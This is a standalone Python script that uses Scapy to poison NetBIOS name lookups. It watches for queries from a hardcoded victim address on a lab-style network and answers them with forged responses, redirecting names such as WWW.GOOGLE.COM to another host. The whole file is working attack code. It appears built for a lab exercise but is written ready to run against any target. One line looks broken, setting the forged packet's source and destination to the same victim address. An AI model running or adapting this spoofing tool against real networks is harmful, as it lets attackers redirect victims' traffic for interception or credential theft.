from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.netbios import NBNSQueryRequest, NBNSQueryResponse


class Dns():

    def __init__(self,networkInterface, victimIP, spoofedWebsites):
        self.networkInterface = networkInterface
        self.victimIP = victimIP
        self.spoofedWebsites = spoofedWebsites


    def startSniffing(self):
        sniff(prn=self.sendFakeResponse, iface=self.networkInterface, filter="port 137", timeout=1)


    def sendFakeResponse(self, pkt):
        if pkt.haslayer(NBNSQueryRequest) and pkt[IP].src == self.victimIP:
            print(pkt[NBNSQueryRequest].QUESTION_NAME + " is being requested.")
            if pkt[NBNSQueryRequest].QUESTION_NAME in self.spoofedWebsites.keys():
                print(pkt[NBNSQueryRequest].QUESTION_NAME + " is being redirected to " + self.spoofedWebsites.get(pkt[NBNSQueryRequest].QUESTION_NAME))
                etherLayer = Ether(src=get_if_hwaddr(self.networkInterface), dst=pkt[Ether].src)
                ipLayer = IP(src=pkt[IP].src, dst=pkt[IP].src)
                udpLayer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                nbnsResponse = NBNSQueryResponse(NAME_TRN_ID=pkt[NBNSQueryRequest].NAME_TRN_ID,
                                                 RR_NAME=pkt[NBNSQueryRequest].QUESTION_NAME,
                                                 QDCOUNT=0, ANCOUNT=1, NSCOUNT=0, ARCOUNT=0, NB_ADDRESS=self.spoofedWebsites.get(pkt[NBNSQueryRequest].QUESTION_NAME))
                poisonedPaket = etherLayer / ipLayer / udpLayer / nbnsResponse

                sendp(poisonedPaket, verbose=0, iface=self.networkInterface)

    def start(self):
        while(True):
            self.startSniffing()


networkInterface = "enp0s3"
victimIP = "192.168.56.101"
spoofedWebsites = {"WWW.GOOGLE.COM" : "192.168.56.102"}

test = Dns(networkInterface, victimIP, spoofedWebsites)
test.start()